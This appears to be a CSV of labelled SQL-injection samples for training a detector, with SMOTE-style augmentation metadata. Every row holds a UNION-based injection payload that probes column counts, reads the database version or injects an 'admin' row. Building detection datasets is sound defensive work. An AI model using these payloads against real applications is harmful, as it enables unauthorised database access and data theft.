id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000197,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000213,0.09911255672435973
SMOTE_000198,attack,union,"-7813""   )    )    as yvyl where 5172  =  5172 union all select 5172,5172#",nearest_attack_euclidean,R000053,0.7670901022463669
SMOTE_000199,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000249,0.12526286824211713
SMOTE_000200,attack,union,"1'  )   where 9091  =  9091 union all select null,null,null,null#",nearest_attack_euclidean,R000225,0.6830315235955529
SMOTE_000201,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000241,0.12904927604170863
SMOTE_000202,attack,union,"1%"" union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000216,0.39276170119717757
SMOTE_000203,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000176,0.03846471892690637
SMOTE_000204,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000262,0.2344805934858826
SMOTE_000205,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000005,1.3930730654439394
SMOTE_000206,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000193,0.606018069156965
SMOTE_000207,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,0.8853838810333349
SMOTE_000208,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000062,0.34190888642695366
SMOTE_000209,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000279,0.7033634825433327
SMOTE_000210,attack,union,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",nearest_attack_euclidean,R000136,1.336527599281616
SMOTE_000211,attack,union," select * from users where id  =  '1' <@._ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000044,4.861988443185925
SMOTE_000212,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000261,0.6974677643769697
SMOTE_000213,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000305,1.5622320823894353
SMOTE_000214,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000190,0.09778976078401871
SMOTE_000215,attack,union,"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R000162,0.7373131607929408
SMOTE_000216,attack,union,"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",nearest_attack_euclidean,R000226,0.19210585635341906
SMOTE_000217,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000154,1.1941130370755841
SMOTE_000218,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000190,0.4370405648358758
SMOTE_000219,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000190,0.09847360758729544
SMOTE_000220,attack,union,"1   )    )    as cvid where 4381  =  4381 union all select null,null--",nearest_attack_euclidean,R000277,1.3212739591414542
SMOTE_000221,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000271,0.7830370836871874
SMOTE_000222,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000130,0.16405221512417473
SMOTE_000223,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000139,0.4241636326346317
SMOTE_000224,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000068,0.05204627628394275
SMOTE_000225,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000285,0.790735775020339
SMOTE_000226,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000261,0.2799153218469412
SMOTE_000227,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000218,0.3772343988925213
SMOTE_000228,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000064,0.44455676338215644
SMOTE_000229,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000233,1.3345426498792725
SMOTE_000230,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000181,0.07770046094676122
SMOTE_000231,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000065,0.2568126628346154
SMOTE_000232,attack,union,-3666'  )   where 6386  =  6386 union all select 6386--,nearest_attack_euclidean,R000184,0.4232318836083855
SMOTE_000233,attack,union,"1  )   as azdb where 4219  =  4219 union all select null,null,null,null#",nearest_attack_euclidean,R000217,0.5151579618109646
SMOTE_000234,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000081,0.6013054941395428
SMOTE_000235,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000128,1.3898556054381892
SMOTE_000236,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000128,0.4886955249400625
SMOTE_000237,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000071,0.7057533303302947
SMOTE_000238,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000081,0.7182239036575029
SMOTE_000239,attack,union,"-1123'   )    )     )   union all select 6735,6735,6735,6735,6735,6735,6735,6735#",nearest_attack_euclidean,R000256,0.3602566580767578
SMOTE_000240,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000201,1.296035255295408
SMOTE_000241,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000170,0.76341370758238
SMOTE_000242,attack,union,"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",nearest_attack_euclidean,R000284,0.22792638867520068
SMOTE_000243,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000258,0.06745818618091957
SMOTE_000244,attack,union,"-7744""   )    )     )   union all select 9408,9408,9408,9408--",nearest_attack_euclidean,R000125,0.00020714384970670026
SMOTE_000245,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000051,0.04521424016526786
SMOTE_000246,attack,union,"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",nearest_attack_euclidean,R000135,0.049502486170260686
SMOTE_000247,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000023,0.06841406348430887
SMOTE_000248,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000097,0.4836963450846289
SMOTE_000249,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000250,1.1756177375127363
SMOTE_000250,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,0.6548534902329104
SMOTE_000251,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000069,0.34975661896250326
SMOTE_000252,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000194,1.696523157543102
SMOTE_000253,attack,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000002,0.32868249989033516
SMOTE_000254,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000007,0.164326010739884
SMOTE_000255,attack,union,"-6527'   )    )    union all select 5053,5053,5053,5053--",nearest_attack_euclidean,R000199,0.06830920383330515
SMOTE_000256,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000212,0.5954892297015589
SMOTE_000257,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000005,3.9650290001572888
SMOTE_000258,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000187,0.2925635843262746
SMOTE_000259,attack,union,"1'  )   where 9091  =  9091 union all select null,null,null,null#",nearest_attack_euclidean,R000225,0.21879552733547145
SMOTE_000260,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000189,0.2756621189321213
SMOTE_000261,attack,union,"-6527'   )    )    union all select 5053,5053,5053,5053--",nearest_attack_euclidean,R000199,1.2244385707079506
SMOTE_000262,attack,union,"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",nearest_attack_euclidean,R000091,0.005722065042051439
SMOTE_000263,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000081,1.2709855598266404
SMOTE_000264,attack,union,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",nearest_attack_euclidean,R000082,0.40642344555956744
SMOTE_000265,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000067,0.7786937683145589
SMOTE_000266,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000070,0.031424943205881475
SMOTE_000267,attack,union," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000033,0.0020453413347645342
SMOTE_000268,attack,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,1.0250712298623619
SMOTE_000269,attack,union,"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",nearest_attack_euclidean,R000109,0.11223647215952308
SMOTE_000270,attack,union,"-1123'   )    )     )   union all select 6735,6735,6735,6735,6735,6735,6735,6735#",nearest_attack_euclidean,R000256,0.7492487073173647
SMOTE_000271,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000087,0.27529661291880325
SMOTE_000272,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000190,0.4622914500461783
SMOTE_000273,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.3189336828497028
SMOTE_000274,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000193,0.8674725446059773
SMOTE_000275,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000143,0.18597701295262373
SMOTE_000276,attack,union,"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",nearest_attack_euclidean,R000278,0.06918220675760232
SMOTE_000277,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000141,1.2714715648042425
SMOTE_000278,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000170,0.08678139150873379
SMOTE_000279,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000046,0.4560240461057924
SMOTE_000280,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000176,0.018061344407778342
SMOTE_000281,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000069,0.5807339707378572
SMOTE_000282,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000190,0.4378924893416055
SMOTE_000283,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,0.2878722101217638
SMOTE_000284,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000062,0.9236153611696364
SMOTE_000285,attack,union,"1'  )   where 9091  =  9091 union all select null,null,null,null#",nearest_attack_euclidean,R000225,1.0084472442759285
SMOTE_000286,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000100,0.700109054536883
SMOTE_000287,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000249,0.6231710041796104
SMOTE_000288,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000297,0.06038369775851823
SMOTE_000289,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000203,0.6176301097276153
SMOTE_000290,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000070,0.2907026006122672
SMOTE_000291,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000212,0.7943728939858502
SMOTE_000292,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000307,0.2553148667046253
SMOTE_000293,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,0.5784386107573903
SMOTE_000294,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.22522332683431756
SMOTE_000295,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000201,0.19776355439691778
SMOTE_000296,attack,union,"-8651""  )   where 8391  =  8391 union all select 8391,8391#",nearest_attack_euclidean,R000171,1.1121035417058724
SMOTE_000297,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000100,0.49398124929371984
SMOTE_000298,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000081,0.45408809153774954
SMOTE_000299,attack,union,"1%'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000207,1.4317207568778711
SMOTE_000300,attack,union,"1""  )   where 5870  =  5870 union all select null,null,null--",nearest_attack_euclidean,R000224,1.099637320920891
SMOTE_000301,attack,union,"1' in boolean mode  )   union all select null,null,null#",nearest_attack_euclidean,R000254,0.3422730209323399
SMOTE_000302,attack,union,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000114,0.02856361611331347
SMOTE_000303,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R000138,0.2107275503276513
SMOTE_000304,attack,union,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",nearest_attack_euclidean,R000132,1.620858138949593
SMOTE_000305,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000173,0.3859958453153689
SMOTE_000306,attack,union,"-5066'   )    )    union all select 9689,9689,9689,9689#",nearest_attack_euclidean,R000272,1.0523864307417508
SMOTE_000307,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R000247,0.15244525001881074
SMOTE_000308,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000306,1.062144068880282
SMOTE_000309,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000182,0.3783021734616554
SMOTE_000310,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,0.5046880091722937
SMOTE_000311,attack,union,"1%"" union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000280,0.10805588004204264
SMOTE_000312,attack,union,"1""  )   where 2633  =  2633 union all select null,null,null,null#",nearest_attack_euclidean,R000126,0.3499517539891445
SMOTE_000313,attack,union,"1'  )   where 9091  =  9091 union all select null,null,null,null#",nearest_attack_euclidean,R000225,0.3628132217479251
SMOTE_000314,attack,union," select * from users where id  =  1 union select @<@,version  (    )   -- 1",nearest_attack_euclidean,R000020,0.9868377471200934
SMOTE_000315,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000159,0.6565976797913039
SMOTE_000316,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000007,0.20895808152016598
SMOTE_000317,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000084,0.5646781864660676
SMOTE_000318,attack,union,"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",nearest_attack_euclidean,R000237,0.011599835807084147
SMOTE_000319,attack,union,"-3379  )   union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",nearest_attack_euclidean,R000112,0.44762360384045896
SMOTE_000320,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000204,1.3723992174044541
SMOTE_000321,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000309,1.4949170245694914
SMOTE_000322,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000049,0.1462289793506258
SMOTE_000323,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000299,0.09915881951049012
SMOTE_000324,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000297,0.11410534620273201
SMOTE_000325,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000267,0.46471519248737553
SMOTE_000326,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000193,1.1616131305364892
SMOTE_000327,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000142,0.3521206646086681
SMOTE_000328,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000048,11.644895340947825
SMOTE_000329,attack,union,"-4121%""  )   union all select 2659,2659,2659,2659,2659,2659,2659,2659--",nearest_attack_euclidean,R000236,0.13621485517594706
SMOTE_000330,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000193,0.7866779192611308
SMOTE_000331,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000208,0.0973558400828542
SMOTE_000332,attack,union,"-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--",nearest_attack_euclidean,R000287,0.02728306941373798
SMOTE_000333,attack,union,"-6527'   )    )    union all select 5053,5053,5053,5053--",nearest_attack_euclidean,R000199,1.3033992612015854
SMOTE_000334,attack,union," select * from users where id  =  1 union select @<@,version  (    )   -- 1",nearest_attack_euclidean,R000020,4.800787923323022
SMOTE_000335,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000291,0.4694685810919389
SMOTE_000336,attack,union,-3666'  )   where 6386  =  6386 union all select 6386--,nearest_attack_euclidean,R000184,0.6672880244445523
SMOTE_000337,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000218,0.18839932682984595
SMOTE_000338,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000069,0.41726810715231566
SMOTE_000339,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000142,0.5890058277189901
SMOTE_000340,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,0.2566348426153712
SMOTE_000341,attack,union,"-9859""   )    )     )   union all select 6595,6595,6595,6595,6595,6595,6595#",nearest_attack_euclidean,R000055,0.9787777921691081
SMOTE_000342,attack,union,"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--",nearest_attack_euclidean,R000283,0.36860733252183914
SMOTE_000343,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000115,1.1861666647037235
SMOTE_000344,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000139,0.13046095551630393
SMOTE_000345,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,0.5811090009979337
SMOTE_000346,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,0.07262044621509316
SMOTE_000347,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000310,0.44720937703786945
SMOTE_000348,attack,union,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",nearest_attack_euclidean,R000282,0.4457665326349924
SMOTE_000349,attack,union," select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000027,0.37061745627979165
SMOTE_000350,attack,union,"1'  )   where 8628  =  8628 union all select null,null,null--",nearest_attack_euclidean,R000274,0.002999791292189465
SMOTE_000351,attack,union,"-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--",nearest_attack_euclidean,R000287,0.4941432968498365
SMOTE_000352,attack,union,"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",nearest_attack_euclidean,R000196,0.06879274170409269
SMOTE_000353,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000038,0.0030251799212387487
SMOTE_000354,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,0.34747818201893427
SMOTE_000355,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000251,1.0112058655061027
SMOTE_000356,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000065,1.0343832246483706
SMOTE_000357,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000014,0.10669118150011285
SMOTE_000358,attack,union,"1"" union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000245,1.0211144339366856
SMOTE_000359,attack,union," select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000015,0.5849493893085944
SMOTE_000360,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000222,0.6122585408589162
SMOTE_000361,attack,union," select * from users where id  =  1 union select @<@,version  (    )   -- 1",nearest_attack_euclidean,R000020,0.4726538909693351
SMOTE_000362,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000304,0.8459628979990819
SMOTE_000363,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000290,0.6102102173924904
SMOTE_000364,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000308,0.30089379567520086
SMOTE_000365,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000233,0.7500144707715233
SMOTE_000366,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000107,0.4139946996042774
SMOTE_000367,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000097,0.40692878242580244
SMOTE_000368,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000299,0.3760998233199738
SMOTE_000369,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000271,0.7575982555458943
SMOTE_000370,attack,union,"1"" union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000245,0.8913265835223358
SMOTE_000371,attack,union,"-2453""  )   union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",nearest_attack_euclidean,R000140,0.1936423311185491
SMOTE_000372,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000168,0.253556823869983
SMOTE_000373,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000183,0.8261945143459333
SMOTE_000374,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000106,0.19660430004208032
SMOTE_000375,attack,union," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000009,0.021778554154602846
SMOTE_000376,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000079,0.44551163020232826
SMOTE_000377,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000004,4.441009648098219
SMOTE_000378,attack,union,"-3462   )    )    as biyl where 5143  =  5143 union all select 5143,5143,5143--",nearest_attack_euclidean,R000094,0.14035848350225155
SMOTE_000379,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000304,0.7052190959688478
SMOTE_000380,attack,union,"1%'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000207,0.9179828502951859
SMOTE_000381,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000029,0.045924648058627095
SMOTE_000382,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000104,0.9800632958549871
SMOTE_000383,attack,union,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",nearest_attack_euclidean,R000211,0.951826067433677
SMOTE_000384,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000167,0.34823206273810164
SMOTE_000385,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000105,0.10184171650197651
SMOTE_000386,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R000252,0.8535041610038463
SMOTE_000387,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000023,3.2553722143374264
SMOTE_000388,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000194,0.32314530232451316
SMOTE_000389,attack,union,"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R000162,0.8471822676178653
SMOTE_000390,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,1.5906516137347853
SMOTE_000391,attack,union,"1'||  (  select 'zpwe' from dual where 7743  =  7743 union all select null,null#",nearest_attack_euclidean,R000083,3.4353722380056855
SMOTE_000392,attack,union,"-9859""   )    )     )   union all select 6595,6595,6595,6595,6595,6595,6595#",nearest_attack_euclidean,R000055,0.45912375449873677
SMOTE_000393,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000240,0.5180605374143075
